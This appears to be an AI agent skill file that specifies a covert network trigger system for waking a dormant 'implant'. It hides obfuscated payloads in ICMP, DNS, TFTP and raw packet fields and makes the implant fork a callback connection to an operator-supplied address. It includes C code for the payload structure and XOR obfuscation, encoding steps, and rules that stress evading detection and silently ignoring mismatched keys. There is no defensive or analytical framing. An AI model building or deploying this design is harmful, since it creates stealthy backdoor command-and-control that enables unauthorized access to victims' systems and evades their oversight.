---
name: covert-network-triggers
description: Use when implementing covert wake-up mechanisms for dormant processes using protocol-specific packet encoding across ICMP, DNS, TFTP, and raw TCP/UDP, with payload obfuscation and CRC validation.
---

# Covert Network Trigger System

## Overview

Multi-protocol trigger system for waking dormant processes via network packets. Payload data is encoded within legitimate protocol fields so triggers appear as normal network traffic. Each protocol uses a different encoding strategy.

## Trigger Types

| Protocol | Encoding Method | Payload Location |
|----------|----------------|------------------|
| ICMP Ping | Timestamp field | Milliseconds field of ICMP timestamp data (2 bytes per ping) |
| ICMP Error | Header fields | IP ID (2B) + dest IP (4B) + TCP src port (2B) + seq number (4B) |
| TFTP WRQ | Base64 filename | Base64-encoded payload as TFTP write request filename |
| DNS Query | Base64 subdomain | Base64-encoded payload as DNS query subdomain |
| Raw TCP/UDP | XOR in random data | XOR-encoded within random packet fill, CRC at computed offset |

## Payload Structure

```c
typedef struct {
    uint8_t     seed;              // XOR obfuscation seed (first byte)
    in_addr_t   callback_addr;     // Callback IP (network byte order)
    uint16_t    callback_port;     // Callback port (network byte order)
    uint8_t     idKey_hash[20];    // SHA-1 of implant key
    uint16_t    crc;               // CRC-16 checksum
} Payload;
```

## Obfuscation Pattern

```c
// XOR obfuscation: first byte is seed, rest XOR'd with seed
void obfuscate_payload(Payload *p, uint8_t *return_buffer) {
    return_buffer[0] = p->seed;
    for (int i = 1; i < sizeof(Payload); i++) {
        return_buffer[i] = ((uint8_t *)p)[i] ^ p->seed;
    }
}
```

## Raw Trigger Encoding (Most Complex)

```
1. Fill packet with random data
2. Compute CRC-16 over CRC_DATA_LENGTH bytes starting at START_PAD
3. Store CRC at: START_PAD + CRC_DATA_LENGTH + (crc % RANDOM_PAD1)
4. Create validator = random * 127 (divisible by 127 for validation)
5. Store validator after CRC
6. XOR-encode payload using random data at computed offset as key:
   payload_key_start = packet + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(Payload)))
   encoded[i] = payload[i] ^ payload_key_start[i]
7. Final packet length includes randomized padding: fieldPtr - packet + (crc % RANDOM_PAD2)
```

## ICMP Ping Trigger Detail

Payload split across multiple pings (Payload.size / 2 pings required):
- Each ping carries 2 bytes in the millisecond field of ICMP timestamp data
- Same random ICMP ID across all pings, sequential sequence numbers
- 1-second delay between pings

## Validation on Implant Side

```c
// 1. Extract payload from protocol-specific fields
// 2. XOR-deobfuscate using seed byte
// 3. Verify CRC-16 matches
// 4. Verify validator is divisible by 127
// 5. Compare SHA-1(received_idKey) against embedded implant key
// 6. Fork callback connection to callback_addr:callback_port
```

## Constraints

- MUST use raw sockets (`PF_PACKET`, `SOCK_RAW`, `IPPROTO_RAW`) for trigger sending
- MUST validate CRC-16 before processing any trigger payload
- MUST verify SHA-1 key hash matches embedded implant key before responding
- MUST use `randShort()` and `randChar()` for randomization -- never use predictable sequences
- SHOULD use `IPPROTO_RAW` to send crafted packets (kernel fills IP checksum)
- MUST handle both ICMP echo request (type 8) and echo reply (type 0) for ping triggers
- ALWAYS fork child process for callback -- parent continues listening for additional triggers
- NEVER respond to triggers with mismatched keys -- silently discard
